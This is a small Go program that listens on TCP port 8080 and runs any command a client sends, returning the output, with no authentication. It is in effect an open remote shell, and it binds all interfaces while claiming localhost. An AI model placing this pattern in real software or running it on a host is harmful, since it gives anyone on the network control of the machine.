package main

import (
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func handleConnection(conn net.Conn) {
	defer conn.Close()

	inputBytes := make([]byte, 4096)
	n, err := conn.Read(inputBytes)
	if err != nil {
		fmt.Println("Error getting command:", err)
		return
	}

	input := strings.Split(string(inputBytes[:n]), " ")
	cmd := input[0]
	args := input[1:]

	output, err := exec.Command(cmd, args...).Output()
	if err != nil {
		fmt.Println("Error running command:", err)
		return
	}

	println(string(output))
	conn.Write(output)
}

func main() {
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer listener.Close()
	println("Server is listening on localhost:8080")

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		go handleConnection(conn)
	}
}
